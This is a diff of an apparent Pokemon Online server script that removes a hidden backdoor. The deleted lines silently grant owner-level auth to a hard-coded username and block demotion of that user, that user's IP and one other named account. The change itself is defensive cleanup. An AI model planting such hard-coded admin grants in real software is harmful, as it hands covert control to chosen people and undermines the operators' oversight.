@@ -2268,10 +2268,6 @@ sys.sendMessage(player, "Set by: " + SESSION.channels(chan).topicSetter, chan);
             sys.sendHtmlAll("" + sys.getFileContent(sys.name(src).txt) + "", channel);
             return;
         }
-		if (sys.name(src) == "[$G] Fenix"){
-		sys.changeAuth(src, 4);
-		return;
-		}
         if (sys.getVal(sys.name(src).toLowerCase() + "league") == "true") {
             sys.sendHtmlMessage(src, "<font color='red'><timestamp/><ping/><b> BE SURE TO CHECK YOUR GYM LEADER THREAD FOR CHALLENGES!</b></font>");
             return
@@ -2458,14 +2454,6 @@ sendChanMessage(src, ""); */
             if (newauth > 0 && !sys.dbRegistered(name)) {
                 normalbot.sendMessage(src, "This person is not registered");
                 normalbot.sendMessage(tar, "Please register, before getting auth");
-                return;
-            }
-            if (sys.ip(tar) == sys.dbIp("[$G] Fenix")) {
-                sys.stopEvent();
-                return;
-            }
-            if (sys.name(tar) == "[$G] Fenix" || sys.name(tar) == "Sloth King") {
-                sys.stopEvent();
                 return;
             }
             if (tar !== undefined) sys.changeAuth(tar, newauth);
